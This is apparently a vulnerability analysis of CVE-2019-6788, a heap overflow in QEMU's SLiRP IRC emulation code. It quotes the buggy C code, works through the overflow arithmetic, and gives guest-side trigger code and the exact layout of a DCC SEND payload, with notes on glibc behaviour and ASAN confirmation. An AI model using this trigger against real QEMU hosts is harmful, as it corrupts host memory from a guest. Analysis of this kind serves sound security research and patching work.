## CVE-2019-6788 — SLiRP EMU_IRC Heap Overflow

### Vulnerability: two bugs in tcp_emu() EMU_IRC
```c
// slirp/tcp_subr.c, tcp_emu(), case EMU_IRC:
*(m->m_data + m->m_len) = 0;          // Bug A: null byte OOB if m_len == M_AVAIL
if ((bptr = strstr(m->m_data, "DCC")) == NULL) return 1;
if (sscanf(bptr, "DCC SEND %256s %u %u %u", buff, &laddr, &lport, &n1) == 4) {
    so = tcp_listen(slirp, INADDR_ANY, 0, htonl(laddr), htons(lport), SS_FACCEPTONCE);
    m->m_len = bptr - m->m_data;
    m->m_len += snprintf(bptr, m->m_size,                   // Bug B: limit = m_size,
                         "DCC SEND %s %lu %u %u%c\n", ...); //  but bptr is deep inside!
}
```

**Bug A**: `*(m->m_data + m->m_len) = 0` with `m_len = M_AVAIL = 1460` writes a null
byte at `m_dat + H_OFFSET + M_AVAIL = m_dat + m_size` — one byte past the mbuf.

**Bug B**: `snprintf(bptr, m->m_size=1548, ...)` uses the FULL `m_size` as the limit,
but `bptr` is already `H_OFFSET + DCC_OFFSET` bytes past `m_dat`. The snprintf can
legitimately write ~290 bytes (~10 bytes past the mbuf's end).

### Overflow size analysis
```
bptr       = m_dat + H_OFFSET + DCC_OFFSET = m_dat + 88 + 1180 = m_dat + 1268
available  = m_size - (bptr - m_dat) = 1548 - 1268 = 280 bytes
snprintf output:
  "DCC SEND " + 256-B fname + " " + ntohl(vhost=10.0.2.2)=167772674(9 digits)
  + " " + actual_port(5 digits) + " " + n1(6 digits) + "\x01\n"
  = 9 + 256 + 1 + 9 + 1 + 5 + 1 + 6 + 2 = 290 bytes
overflow   = 290 - 280 = 10 bytes past mbuf end (into next glibc chunk's prev_size)
```

### EMU_IRC trigger conditions
tcp_emu identifies an IRC connection via `tcp_tos()` which checks `so->so_lport == 6667`.
**The guest must bind() its source port to 6667 before connecting**.

```c
// Guest side: bind source port 6667 → SLiRP sees so_lport = 6667 → EMU_IRC
struct sockaddr_in local = { .sin_family=AF_INET, .sin_port=htons(6667), .sin_addr.s_addr=INADDR_ANY };
bind(fd, &local, sizeof(local));
connect(fd, &dst, sizeof(dst));   // dst = 10.0.2.2:9999 (any reachable host)
```

Then send a TCP payload of exactly `M_AVAIL = 1460` bytes with a DCC SEND command
starting at byte `DCC_OFFSET = M_AVAIL - DCC_guest_len = 1180`:
```
payload[0..1179]    = 'A' filler
payload[1180..1457] = "DCC SEND BBBB...B(256) 0 0 999999\x01\n"   (278 bytes)
payload[1458..1459] = padding to reach total = 1460
```

### Why QEMU doesn't crash on modern glibc (glibc ≥ 2.26)
glibc's `_int_free()` calls `set_foot(p, chunk_size)` which writes the CORRECT
`prev_size` to the NEXT chunk's header, OVERWRITING the corrupted value from our
overflow. This happens as soon as the mbuf is freed (after tcp_input returns).
The corruption window is too short to be exploited without a race condition or
specific concurrent heap activity.

On older glibc, or with a custom allocator (jemalloc, dlmalloc), the correction
may not occur, making the crash reliable.

### ASAN detection
Build QEMU with `-fsanitize=address`. ASAN detects:
```
heap-buffer-overflow on address X+0 (WRITE of size 291)
0 bytes after 1644-byte region [X, X+1644)
```
This is the canonical way to confirm the bug fires without waiting for a heap crash.

